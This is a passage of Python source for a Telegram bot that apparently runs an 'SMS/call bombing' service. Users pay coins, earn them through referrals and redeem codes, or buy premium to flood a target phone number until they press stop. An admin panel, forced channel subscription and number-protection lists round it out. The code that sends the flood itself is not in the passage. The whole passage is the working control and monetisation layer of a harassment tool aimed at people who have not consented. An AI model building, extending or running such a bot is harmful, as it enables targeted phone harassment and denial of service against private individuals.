    if amt <= 0 or mx <= 0: await update.message.reply_text("❌ Amount and max uses must be positive."); return
    code = await create_redeem(amt, mx, update.effective_user.id)
    await update.message.reply_text(f"✅ Redeem code created:\n<code>{code}</code>\nAmount: {amt} coins\nMax uses: {mx}", parse_mode="HTML")

async def redeem_command(update, context):
    uid = update.effective_user.id
    await ensure_user(update, context)
    if not context.args: await update.message.reply_text("❌ Usage: <code>/redeem &lt;code&gt;</code>", parse_mode="HTML"); return
    ok, msg = await redeem_code(uid, context.args[0].strip().upper())
    if ok:
        await update.message.reply_text(f"✅ {msg}\n💰 New balance: {await get_coins(uid)} coins", parse_mode="HTML")
    else: await update.message.reply_text(f"❌ {msg}", parse_mode="HTML")

async def refer_command(update, context):
    uid = update.effective_user.id
    await ensure_user(update, context)
    code = await get_ref_code(uid)
    if not code:
        code = gen_code(uid); await q('UPDATE users SET referral_code=? WHERE user_id=?', (code, uid), commit=True)
    await update.message.reply_text(f"🎁 <b>Your referral link</b>\n\nShare this link with friends:\n<code>https://t.me/{bot_username}?start=ref_{code}</code>\n\nWhen they start the bot, you get 1 coin!\nUse /balance to check your coins.", parse_mode="HTML")

async def balance_command(update, context):
    uid = update.effective_user.id
    await ensure_user(update, context)
    await update.message.reply_text(f"💰 <b>Your balance:</b> <code>{await get_coins(uid)}</code> coins\n\n1 coin = 1 bombing session.\nGet more: /refer\nBuy premium: /premium", parse_mode="HTML")

async def referrals_command(update, context):
    uid = update.effective_user.id
    await ensure_user(update, context)
    r = await q('SELECT referred_count FROM users WHERE user_id=?', (uid,), 'one')
    await update.message.reply_text(f"👥 <b>Total referrals:</b> {r[0] if r else 0}\n\nKeep sharing your link to earn more coins!", parse_mode="HTML")

async def button_callback(update, context):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    await ensure_user(update, context)
    data = query.data

    if data == "check_subscribe":
        ok, missing = await check_membership(uid, context)
        if ok: await show_main_menu(update, context, edit=True)
        else: await send_force_subscribe_message(update.effective_chat.id, context, missing); await query.message.delete()
        return

    admin_actions = {"admin_panel","admin_add_coins","admin_remove_coins","admin_create_code","admin_give_premium","admin_remove_premium","admin_add_global_protect","admin_remove_global_protect","admin_list_global_protects","admin_broadcast","admin_close"}
    if data not in admin_actions:
        ok, missing = await check_membership(uid, context)
        if not ok: await send_force_subscribe_message(update.effective_chat.id, context, missing); await query.message.delete(); return

    admin_kbd = InlineKeyboardMarkup([[cb("➕ Add Coins", callback_data="admin_add_coins", style="success")],
        [cb("➖ Remove Coins", callback_data="admin_remove_coins", style="danger")],
        [cb("🎫 Create Redeem Code", callback_data="admin_create_code", style="success")],
        [cb("👑 Give Premium", callback_data="admin_give_premium", style="success")],
        [cb("❌ Remove Premium", callback_data="admin_remove_premium", style="danger")],
        [cb("➕ Add Global Protect", callback_data="admin_add_global_protect", style="success")],
        [cb("➖ Remove Global Protect", callback_data="admin_remove_global_protect", style="danger")],
        [cb("📋 List Global Protects", callback_data="admin_list_global_protects", style="success")],
        [cb("📢 Broadcast", callback_data="admin_broadcast", style="primary")],
        [cb("🔙 Back to Main Menu", callback_data="main_menu", style="primary")]])

    prompts = {
        "admin_add_coins": ("add_coins", "➕ <b>Add Coins</b>\n\nSend user ID and amount:\n<code>user_id amount</code>\nExample: <code>123456789 5</code>\n\nType /cancel to abort."),
        "admin_remove_coins": ("remove_coins", "➖ <b>Remove Coins</b>\n\nSend user ID and amount:\n<code>user_id amount</code>\nExample: <code>123456789 2</code>\n\nType /cancel to abort."),
        "admin_create_code": ("create_code", "🎫 <b>Create Redeem Code</b>\n\nSend amount and max uses:\n<code>amount max_uses</code>\nExample: <code>5 10</code>\n\nType /cancel to abort."),
        "admin_give_premium": ("give_premium", "👑 <b>Give Premium</b>\n\nSend user ID and days:\n<code>user_id days</code>\nExample: <code>123456789 30</code>\n\nType /cancel to abort."),
        "admin_remove_premium": ("remove_premium", "❌ <b>Remove Premium</b>\n\nSend user ID:\n<code>user_id</code>\n\nType /cancel to abort."),
        "admin_add_global_protect": ("add_global_protect", "🛡️ <b>Add Global Protect</b>\n\nSend phone number (10+ digits):\nExample: <code>9876543210</code>\n\nType /cancel to abort."),
        "admin_remove_global_protect": ("remove_global_protect", "🛡️ <b>Remove Global Protect</b>\n\nSend phone number:\nExample: <code>9876543210</code>\n\nType /cancel to abort."),
    }

    if data == "admin_panel":
        if uid != ADMIN_CHAT_ID: await query.edit_message_text("⛔ Unauthorized."); return
        await query.edit_message_text("👑 <b>Admin Panel</b>\nChoose an action:", parse_mode="HTML", reply_markup=admin_kbd); return
    if data == "admin_broadcast":
        if uid != ADMIN_CHAT_ID: await query.edit_message_text("⛔ Unauthorized."); return
        context.user_data['admin_action'] = 'broadcast'
        await query.edit_message_text("📢 <b>Broadcast Message</b>\n\nSend the message to broadcast.\n\nType /cancel to abort.", parse_mode="HTML"); return
    if data in prompts:
        if uid != ADMIN_CHAT_ID: await query.edit_message_text("⛔ Unauthorized."); return
        act, txt = prompts[data]; context.user_data['admin_action'] = act
        await query.edit_message_text(stylish_text(txt), parse_mode="HTML"); return
    if data == "admin_list_global_protects":
        if uid != ADMIN_CHAT_ID: await query.edit_message_text("⛔ Unauthorized."); return
        ps = await list_gp()
        txt = "📭 No globally protected numbers." if not ps else "🛡️ <b>Globally Protected Numbers</b>\n\n" + "\n".join(f"• <code>{n}</code>" for n in ps)
        await query.edit_message_text(stylish_text(txt), parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[cb("🔙 Back to Admin Panel", callback_data="admin_panel")]])); return
    if data == "admin_close":
        if uid != ADMIN_CHAT_ID: await query.edit_message_text("⛔ Unauthorized."); return
        await query.edit_message_text("Admin panel closed."); await show_main_menu(update, context, edit=True); return

    if data == "protect_menu":
        pl = await get_protections(uid)
        txt = ("🛡️ <b>Your Protected Numbers</b>\n\n" + "\n".join(f"• <code>{n}</code>" for n in pl) + "\n\nUse /unprotect <number> to remove.") if pl else "📭 You have no protected numbers.\n\nUse /protect <number> to add a number you never want to bomb."
        kbd = [[cb("➕ Add Protection", callback_data="protect_add", style="success")],[cb("🔙 Back to Main Menu", callback_data="main_menu")]]
        await query.edit_message_text(stylish_text(txt), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kbd)); return
    if data == "protect_add":
        context.user_data['awaiting_protect'] = True
        await query.edit_message_text("🛡️ <b>Add a number to your protection list</b>\n\nSend me the phone number (10+ digits).\nExample: <code>9876543210</code>\n\nType /cancel to abort.", parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[cb("🔙 Back", callback_data="protect_menu", style="success")]])); return
    if data == "premium_info":
        bal = await get_coins(uid); isp = await is_premium(uid); exp = await get_expiry(uid)
        st = "✅ <b>Active</b>" if isp else "❌ <b>Inactive</b>"
        if isp and exp > 0: st += f" (expires in {(exp-int(time.time()))//86400} days)"
        txt = (f"👑 <b>Premium Subscription</b>\n\nYour status: {st}\n💰 Your coins: {bal}\n\n<b>Benefits:</b>\n"
               "• Bombing costs <b>0 coins</b>\n• <b>No duration limit</b>\n\n<b>Prices:</b>\n• 7 days  → 50 coins\n• 30 days → 100 coins\n\nSelect an option below:")
        kbd = [[InlineKeyboardButton("7 Days (50 coins)", callback_data="buy_premium_7")],[InlineKeyboardButton("30 Days (100 coins)", callback_data="buy_premium_30")],[cb("🔙 Back", callback_data="main_menu")]]
        await query.edit_message_text(stylish_text(txt), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kbd)); return
    if data in ("buy_premium_7", "buy_premium_30"):
        ok, msg = await buy_premium(uid, 7 if data.endswith("7") else 30)
        await query.edit_message_text((f"✅ {msg}\n\nUse /myinfo to see your new status." if ok else f"❌ {msg}\n\nEarn more coins via /refer or redeem codes."), parse_mode="HTML"); return
    if data == "my_info":
        d = await get_user(uid)
        if d:
            _, un, fn, ln, _, _, coins, refs, pu = d
            ps = "✅ Active" if pu > int(time.time()) else "❌ Inactive"
            if pu > 0: ps += f" (expires in {max(0,(pu-int(time.time()))//86400)} days)"
            await query.edit_message_text(
                f"📌 <b>Your Info</b>\n🆔 <b>User ID:</b> <code>{uid}</code>\n👤 <b>Name:</b> {escape((fn+' '+ln).strip())}\n"
                f"🔖 <b>Username:</b> @{escape(un) if un else 'None'}\n💰 <b>Coins:</b> {coins}\n👥 <b>Referrals:</b> {refs}\n👑 <b>Premium:</b> {ps}",
                parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[cb("🔙 Back", callback_data="main_menu")]]))
        else: await query.edit_message_text("Error retrieving your data.")
        return
    if data == "start_bomb":
        ok, missing = await check_membership(uid, context)
        if not ok: await send_force_subscribe_message(update.effective_chat.id, context, missing); await query.message.delete(); return
        context.user_data['awaiting_phone'] = True
        await query.edit_message_text("📞 Please send the target phone number (10 digits):\n\nExample: <code>9876543210</code>\n\nType /cancel to abort.\n\n⚠️ Bombing costs 1 coin (Premium users & Admins free).\n🛡️ Protected numbers will be refused.\n🔄 Bombing will continue until you press <b>Stop Bombing</b>.",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[cb("🔙 Back", callback_data="main_menu")]])); return
    if data == "stop_bomb":
        chat_id = update.effective_chat.id
        if chat_id in active_tasks and not active_tasks[chat_id].done():
            active_tasks[chat_id].cancel(); await query.edit_message_text("🛑 Stopping bombing... Please wait.")
        else: await query.edit_message_text("❌ No active bombing to stop.", reply_markup=InlineKeyboardMarkup([[cb("🔙 Back", callback_data="main_menu")]]))
        return
    if data == "refer_info":
        bal = await get_coins(uid); code = await get_ref_code(uid)
        if not code:
            code = gen_code(uid); await q('UPDATE users SET referral_code=? WHERE user_id=?', (code, uid), commit=True)
        await query.edit_message_text(
            f"💰 <b>Refer & Earn</b>\n\nYour balance: <code>{bal}</code> coins\n1 coin = 1 bombing session\n\n"
            f"<b>Your referral link:</b>\n<code>https://t.me/{bot_username}?start=ref_{code}</code>\n\n"
            "Share with friends. When they start the bot, you get 1 coin!\nUse /balance to check coins.\nUse /referrals to see referrals.",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[cb("🔙 Back", callback_data="main_menu")]])); return
    if data == "redeem_code":
        context.user_data['awaiting_redeem'] = True
        await query.edit_message_text("🎫 <b>Redeem Code</b>\n\nPlease send the redeem code.\n\nExample: <code>ABC123XYZ</code>\n\nType /cancel to abort.",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[cb("🔙 Back", callback_data="main_menu")]])); return
    if data == "main_menu":
        for k in ('awaiting_phone','awaiting_protect','awaiting_redeem'): context.user_data.pop(k, None)
        await show_main_menu(update, context, edit=True); return

async def handle_message(update, context):
    uid = update.effective_user.id
    await ensure_user(update, context)
    text = update.message.text.strip()

    if uid == ADMIN_CHAT_ID and context.user_data.get('admin_action'):
        act = context.user_data['admin_action']
        parts = text.split()
        if act == 'broadcast':
            await update.message.reply_text("📢 Broadcasting... This may take a while.")
            t, s, f = await broadcast(context, text)
            await update.message.reply_text(f"✅ Broadcast completed.\n👥 Total users: {t}\n✅ Sent: {s}\n❌ Failed: {f}")
        elif act == 'create_code':
            if len(parts) != 2 or not all(p.isdigit() for p in parts):
                await update.message.reply_text("❌ Invalid format. Send: <code>amount max_uses</code>", parse_mode="HTML"); return
            amt, mx = map(int, parts)
            if amt <= 0 or mx <= 0: await update.message.reply_text("❌ Amount and max uses must be positive."); return
            code = await create_redeem(amt, mx, uid)
            await update.message.reply_text(f"✅ Redeem code created:\n<code>{code}</code>\nAmount: {amt} coins\nMax uses: {mx}", parse_mode="HTML")
        elif act == 'give_premium':
            if len(parts) != 2 or not all(p.isdigit() for p in parts):
                await update.message.reply_text("❌ Send: <code>user_id days</code>", parse_mode="HTML"); return
            tid, days = map(int, parts)
            if days <= 0: await update.message.reply_text("❌ Days must be positive."); return
            await update.message.reply_text(await admin_give_premium(tid, days, context))
        elif act == 'remove_premium':
            if len(parts) != 1 or not parts[0].isdigit():
                await update.message.reply_text("❌ Send: <code>user_id</code>", parse_mode="HTML"); return
            await update.message.reply_text(await admin_remove_premium(int(parts[0]), context))
        elif act in ('add_coins','remove_coins'):
            if len(parts) != 2 or not all(p.isdigit() for p in parts):
                await update.message.reply_text("❌ Send: <code>user_id amount</code>", parse_mode="HTML"); return
            tid, amt = map(int, parts)
            if amt <= 0: await update.message.reply_text("❌ Amount must be positive."); return
            if act == 'add_coins':
                bal = await admin_add_coins(tid, amt, context)
                await update.message.reply_text(f"✅ Added {amt} coin(s) to user {tid}.\nNew balance: {bal}")
            else:
                ok, bal = await admin_remove_coins(tid, amt, context)
                if ok: await update.message.reply_text(f"✅ Removed {amt} coin(s) from user {tid}.\nNew balance: {bal}")
                else: await update.message.reply_text(f"❌ User {tid} has only {bal} coins. Cannot remove {amt}.")
        elif act == 'add_global_protect':
            p = clean_phone(text)
            if len(p) < 10: await update.message.reply_text("❌ Invalid phone number."); return
            if await add_gp(p):
                await update.message.reply_text(f"✅ Number <code>{p}</code> added to <b>global protection</b>.", parse_mode="HTML")
            else: await update.message.reply_text(f"⚠️ Number <code>{p}</code> is already globally protected.", parse_mode="HTML")
        elif act == 'remove_global_protect':
            p = clean_phone(text)
            if not p: await update.message.reply_text("❌ Invalid phone number."); return
            if await remove_gp(p):
                await update.message.reply_text(f"✅ Number <code>{p}</code> removed from global protection.", parse_mode="HTML")
            else: await update.message.reply_text(f"⚠️ Number <code>{p}</code> was not in global protection list.", parse_mode="HTML")
        context.user_data.pop('admin_action', None); return

    if context.user_data.get('awaiting_redeem'):
        code = text.strip().upper()
        ok, msg = await redeem_code(uid, code)
        if ok:
            await update.message.reply_text(f"✅ {msg}\n💰 New balance: {await get_coins(uid)} coins", parse_mode="HTML")
        else: await update.message.reply_text(f"❌ {msg}", parse_mode="HTML")
        context.user_data.pop('awaiting_redeem', None); return

    if context.user_data.get('awaiting_protect'):
        p = clean_phone(text)
        if len(p) < 10: await update.message.reply_text("❌ Invalid phone number."); return
        if await add_protection(uid, p): await update.message.reply_text(f"✅ Number <code>{p}</code> added to your protection list.", parse_mode="HTML")
        else: await update.message.reply_text(f"⚠️ Number <code>{p}</code> is already protected.", parse_mode="HTML")
        context.user_data.pop('awaiting_protect', None)
        pl = await get_protections(uid)
        txt = ("🛡️ <b>Your Protected Numbers</b>\n\n" + "\n".join(f"• <code>{n}</code>" for n in pl)) if pl else "📭 You have no protected numbers."
        await update.message.reply_text(stylish_text(txt), parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[cb("🔙 Back to PROTECT Menu", callback_data="protect_menu", style="success")]])); return

    if context.user_data.get('awaiting_phone'):
        ok, missing = await check_membership(uid, context)
        if not ok: await send_force_subscribe_message(update.effective_chat.id, context, missing); context.user_data.pop('awaiting_phone', None); return
        p = clean_phone(text)
        if len(p) < 10: await update.message.reply_text("❌ Invalid phone number. Please send a valid number (10-15 digits).", parse_mode="HTML"); return
        context.user_data.pop('awaiting_phone', None)
        await _start_bombing(update, context, p, via_button=True); return

    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━━\n📢 <b>Your message has been recorded</b>\n━━━━━━━━━━━━━━━━━━━━━\n💬 Admin will review it.\n📞 To bomb, press Start Bombing button.", parse_mode="HTML")

async def cancel(update, context):
    for k, msg in (('awaiting_phone','Bombing cancelled.'),('awaiting_protect','Protection addition cancelled.'),('awaiting_redeem','Redeem code cancelled.'),('admin_action','Admin action cancelled.')):
        if context.user_data.pop(k, None): await update.message.reply_text(f"✅ {msg}"); return
    await update.message.reply_text("❌ No pending operation to cancel.")

async def post_init(app):
    await app.bot.delete_webhook(drop_pending_updates=True)
    await init_db()
    logger.info(f"Webhook deleted and DB initialized. Total APIs loaded: {len(APIS)}")

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    for cmd, fn in [("start",start),("bomb",bomb_command),("stop",stop_bombing),("cancel",cancel),("refer",refer_command),
                    ("balance",balance_command),("referrals",referrals_command),("admin",admin_panel),("createcode",create_code_command),
                    ("redeem",redeem_command),("premium",premium_command),("myinfo",my_info),("protect",protect_command),
                    ("unprotect",unprotect_command),("myprotects",myprotects_command)]:
        app.add_handler(CommandHandler(cmd, fn))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    logger.info(f"Bot started with {len(APIS)} total APIs (original + ULTIMATEAPIS merged).")
    app.run_polling()

if __name__ == "__main__":
    main()